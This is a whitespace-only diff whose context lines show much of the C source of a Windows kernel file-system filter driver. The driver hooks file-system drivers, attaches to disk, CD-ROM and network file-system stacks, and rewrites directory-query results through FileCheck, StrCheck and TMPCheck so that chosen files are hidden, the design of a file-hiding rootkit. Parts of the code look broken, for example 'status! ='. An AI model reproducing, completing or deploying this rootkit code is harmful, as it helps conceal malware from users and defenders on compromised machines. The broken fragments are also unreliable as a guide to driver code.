@@ -4,12 +4,12 @@ typedef struct _DEVICE_EXTENSION
 {
   PDEVICE_OBJECT AttachedDevice;
   PDEVICE_OBJECT RealDevice;
-  
+
 }_DEVICE_EXTENSION, *PDEVICE_EXTENSION;
 
 extern POBJECT_TYPE* IoDriverObjectType;
 
-typedef struct 
+typedef struct
 {
       ULONG Object;
       PDEVICE_OBJECT DeviceObject;
@@ -64,29 +64,29 @@ ULONG FileCheck (PVOID UserBuffer,ULONG NextEntryOffset,ULONG EndOfFile,ULONG Fi
 ULONG StrCheck(PCWSTR TargetString,PCWSTR SourceString,int Size);
 ULONG TMPCheck(PCWSTR Filename,int Length,int LowPart,int HighPart);
 
-VOID 
+VOID
 CallDriver
 (PDEVICE_OBJECT DeviceObject,
  PIRP Irp)
-{ 
+{
 
      Irp->CurrentLocation++;
-     Irp->Tail.Overlay.CurrentStackLocation = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation + (ULONG)sizeof(IO_STACK_LOCATION));// 0x24); 
+     Irp->Tail.Overlay.CurrentStackLocation = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation + (ULONG)sizeof(IO_STACK_LOCATION));// 0x24);
      IoCallDriver(((PDEVICE_EXTENSION)(DeviceObject->DeviceExtension))->AttachedDevice,Irp);
 };
 
 
-VOID 
+VOID
 IRPDispatchRoutine
 (PDEVICE_OBJECT DeviceObject,
  PIRP Irp)
 {
     return CallDriver(DeviceObject, Irp);
-  
+
 }
 
 
-VOID 
+VOID
 SetZero
 (PDEVICE_EXTENSION DeviceExtention,
 ULONG Value){
@@ -95,9 +95,9 @@ ULONG Value){
     DeviceExtention->RealDevice = (PDEVICE_OBJECT) Value;
 };
 
-NTSTATUS 
+NTSTATUS
 DriverEntry
-(IN PDRIVER_OBJECT pDriverObject, 
+(IN PDRIVER_OBJECT pDriverObject,
 IN PUNICODE_STRING theRegistryPath )
 {
     int i;
@@ -106,7 +106,7 @@ IN PUNICODE_STRING theRegistryPath )
     status = IoCreateDevice(DriverObject, sizeof(_DEVICE_EXTENSION), 0, FILE_DEVICE_DISK_FILE_SYSTEM, 0x100, 0, &DeviceObject);
     if (status != STATUS_SUCCESS){
         IoDeleteDevice(DeviceObject);
-        return 0;   
+        return 0;
     }
     SetZero(DeviceObject->DeviceExtension, 0);
     for(i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++ )
@@ -118,7 +118,7 @@ IN PUNICODE_STRING theRegistryPath )
     SetFastIoDispatch();
     HookingFileSystems();
     status = IoRegisterFsRegistrationChange( DriverObject, (PDRIVER_FS_NOTIFICATION)DriverNotificationRoutine);
-    if (status! = STATUS_SUCCESS){    
+    if (status! = STATUS_SUCCESS){
         IoDeleteDevice(DeviceObject);
         DriverObject->FastIoDispatch = 0;
         return status;
@@ -126,7 +126,7 @@ IN PUNICODE_STRING theRegistryPath )
     return STATUS_SUCCESS;
 };
 
-NTSTATUS 
+NTSTATUS
 HookingFileSystems()
 {
      UNICODE_STRING SystemRoutineName;
@@ -141,7 +141,7 @@ HookingFileSystems()
      return STATUS_SUCCESS;
 }
 
-VOID 
+VOID
 HookOne
 (FUNC,PCWSTR FileSystem)
 {
@@ -168,13 +168,13 @@ HookOne
 #define COMMAND_ATTACH 1
 #define COMMAND_DETACH 0
 
-VOID 
+VOID
 DriverNotificationRoutine
 (PDEVICE_OBJECT TargetDevice,
  int command)
 {
     PDEVICE_OBJECT AttachedDevice;
-    
+
     if (command == COMMAND_ATTACH){
         AttachDevice(TargetDevice);
     }else{
@@ -188,15 +188,15 @@ DriverNotificationRoutine
             TargetDevice=AttachedDevice;
             AttachedDevice=TargetDevice->AttachedDevice;
         };
-         
+
     };
 };
 
-VOID 
+VOID
 AttachDevice
 (PDEVICE_OBJECT TargetDevice)
 {
-  
+
     PDEVICE_OBJECT SourceDevice;
     if (TargetDevice->DeviceType == FILE_DEVICE_DISK_FILE_SYSTEM || TargetDevice->DeviceType == FILE_DEVICE_CD_ROM_FILE_SYSTEM || TargetDevice->DeviceType ==  FILE_DEVICE_NETWORK_FILE_SYSTEM)
     {
@@ -206,11 +206,11 @@ AttachDevice
       SetZero(SourceDevice->DeviceExtension,0);
       if (AttachToStack(SourceDevice,TargetDevice,SourceDevice->DeviceExtension)!= TRUE){
           IoDeleteDevice(SourceDevice);
-          return;        
+          return;
       };
     };
 };
-BOOLEAN 
+BOOLEAN
 IsAllreadyAttached
 (PDEVICE_OBJECT TargetDevice)
 {
@@ -223,21 +223,21 @@ IsAllreadyAttached
             };
             AttachedDevice=AttachedDevice->AttachedDevice;
         };
-         
+
   }
   return FALSE;
 }
 
-NTSTATUS 
+NTSTATUS
 CreateDevice
 (PDEVICE_OBJECT TargetDevice,
  PDEVICE_OBJECT *SourceDevice)
 {
   return IoCreateDevice(DriverObject,sizeof(_DEVICE_EXTENSION),0,TargetDevice->DeviceType,0,0,SourceDevice);
-  
+
 }
 
-BOOLEAN 
+BOOLEAN
 IsMyDevice
 (PDEVICE_OBJECT TargetDevice)
 {
@@ -247,7 +247,7 @@ IsMyDevice
   return FALSE;
 };
 
-VOID 
+VOID
 SettingFlags
 (PDEVICE_OBJECT DeviceObject,
  PDEVICE_OBJECT TargetDevice)
@@ -256,7 +256,7 @@ SettingFlags
   DeviceObject->Characteristics |= (TargetDevice->Characteristics & FILE_DEVICE_SECURE_OPEN);
 };
 
-BOOLEAN 
+BOOLEAN
 AttachToStack
 (PDEVICE_OBJECT SourceDevice,
  PDEVICE_OBJECT TargetDevice,
@@ -264,12 +264,12 @@ AttachToStack
 {
   DeviceExtension->AttachedDevice = TargetDevice;
   if (IoAttachDeviceToDeviceStack(SourceDevice,TargetDevice) == STATUS_SUCCESS){
-      return TRUE;  
+      return TRUE;
   };
   return FALSE;
 }
 
-VOID 
+VOID
 OnFileSystemControl
 (PDEVICE_OBJECT DeviceObject,
  PIRP Irp)
@@ -281,7 +281,7 @@ OnFileSystemControl
   }
 };
 
-VOID 
+VOID
 SetCompletionFileControl
 (PDEVICE_OBJECT TargetDevice,
  PIRP Irp)
@@ -302,7 +302,7 @@ SetCompletionFileControl
 };
 
 
-NTSTATUS 
+NTSTATUS
 SetFSCompletionRoutine
 (PDEVICE_OBJECT DeviceObject,
  PIRP Irp)
@@ -318,7 +318,7 @@ SetFSCompletionRoutine
   *Buff = DeviceObject;
   CurrentStack = Irp->Tail.Overlay.CurrentStackLocation;
   PrevStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation - (ULONG)sizeof(IO_STACK_LOCATION));
-  
+
   for (i = 0;i<8;i++){
     PrevStack[i]=CurrentStack[i];
   };
@@ -331,7 +331,7 @@ SetFSCompletionRoutine
 };
 
 
-NTSTATUS 
+NTSTATUS
 FileControlCompletionRoutine
 (PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
@@ -356,7 +356,7 @@ FileControlCompletionRoutine
   return STATUS_SUCCESS;
 };
 
-BOOLEAN 
+BOOLEAN
 AttachDelayThread
 (PDEVICE_OBJECT DeviceObject,
  PDEVICE_OBJECT TargetDevice)
@@ -366,7 +366,7 @@ AttachDelayThread
   SettingFlags(DeviceObject,TargetDevice);
   for ( i = 0;i<8 ;i++){
     if (AttachToStack(DeviceObject,TargetDevice,DeviceObject->DeviceExtension)== TRUE){
-        return TRUE;        
+        return TRUE;
     };
     *((ULONG*)((ULONG)&Interval+(ULONG)4)) = -1;
     *((ULONG*)&Interval) = -5000000;
@@ -375,7 +375,7 @@ AttachDelayThread
   return FALSE;
 };
 
-VOID 
+VOID
 OnDirectoryControl
 (PDEVICE_OBJECT DeviceObject,
 PIRP Irp)
@@ -387,7 +387,7 @@ PIRP Irp)
   }
 };
 
-VOID 
+VOID
 SetCompletionDirControl
 (PDEVICE_OBJECT DeviceObject,
 PIRP Irp)
@@ -413,18 +413,18 @@ PIRP Irp)
       };
       goto Inject;
 Error:
-  
+
     CurrentStack->Parameters.QueryDirectory.FileName = 0;
     if (Irp->Tail.Overlay.CurrentStackLocation->FileObject != 0)Irp->Tail.Overlay.CurrentStackLocation->FileObject->Flags &= 0x400000;
     CallDriver(DeviceObject,Irp);
     return;
-  }; 
-  
+  };
+
 Inject:
-  
+
   CurrentStack->Control=1;
   PrevStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation - (ULONG)sizeof(IO_STACK_LOCATION));
-  
+
   for (i = 0;i<8;i++){
     PrevStack[i]=CurrentStack[i];
   };
@@ -437,7 +437,7 @@ Inject:
 };
 
 
-NTSTATUS 
+NTSTATUS
 DirectoryCompletionRoutine
 (PDEVICE_OBJECT DeviceObject,
 PIRP Irp,
@@ -467,7 +467,7 @@ PDEVICE_OBJECT* Context)
       };
     }else if (Irp->MdlAddress->MappedSystemVa == 0){
       FreeMdl(Irp,LclContext);
-      return 0;  
+      return 0;
     };
   }else{
     mmFiles=Irp->UserBuffer;
@@ -483,14 +483,14 @@ PDEVICE_OBJECT* Context)
       if (LclContext == 0 || AllocateMdl(LclContext,Irp,Irp->Tail.Overlay.CurrentStackLocation) == 0){
         FreeMdl(Irp,LclContext);
         Irp->IoStatus.Status=0x0C000009A;
-        return 0;  
+        return 0;
       };
   };
    Irp->IoStatus.Status = CreateWorkRoutine(DeviceObject,Irp->Tail.Overlay.CurrentStackLocation,Irp,LclContext);
    return;
 };
 
-VOID 
+VOID
 FreeMdl
 (PIRP Irp,
 PMDL* Context)
@@ -501,10 +501,10 @@ PMDL* Context)
        IoFreeMdl(*Context);
   };
   ExFreePoolWithTag(*Context,0);
-  
+
 };
 
-ULONG 
+ULONG
 AllocateMdl
 (PMDL* LclContext,
 PIRP Irp,
@@ -521,7 +521,7 @@ PIO_STACK_LOCATION CurrentStack)
   return 1;
 };
 
-ULONG 
+ULONG
 CreateWorkRoutine(
 PDEVICE_OBJECT DeviceObject,
 PIO_STACK_LOCATION CurrentStack,
@@ -555,7 +555,7 @@ PVOID LclContext)
   return 0xC0000016;
 };
 
-NTSTATUS 
+NTSTATUS
 WorkerRoutine
 (PDEVICE_OBJECT DeviceObject,
  PLARGE_INTEGER Context)
@@ -567,7 +567,7 @@ WorkerRoutine
 };
 
 
-ULONG 
+ULONG
 GetOffsets
 (ULONG FileInformationClass,
  ULONG* EndOfFile,
@@ -575,7 +575,7 @@ GetOffsets
  ULONG* FilenameLength)
 {
   switch (FileInformationClass) {
-   case FileBothDirectoryInformation : 
+   case FileBothDirectoryInformation :
          *EndOfFile = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, EndOfFile);
          *FilenameOffset = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName);
    case FileDirectoryInformation:
@@ -602,7 +602,7 @@ GetOffsets
   return 1;
 };
 
-ULONG 
+ULONG
 FileCheck
 (ULONG* UserBuffer,
  ULONG NextEntryOffset,
@@ -615,7 +615,7 @@ FileCheck
   ULONG PrevOffset;
   PCWSTR Filename;
   ULONG Length;
-  
+
   EntryPtr = 0;
   PrevOffset = NextEntryOffset;
   (ULONG)UserBuffer &= 0xFFFFFF00;
@@ -665,7 +665,7 @@ FileCheck
   return ((ULONG)UserBuffer & 1);
 };
 
-ULONG 
+ULONG
 StrCheck
 (PCWSTR TargetString,
  PCWSTR SourceString,
@@ -684,7 +684,7 @@ StrCheck
   return 1;
 };
 
-ULONG 
+ULONG
 TMPCheck
 (PCWSTR Filename,
 int Length,
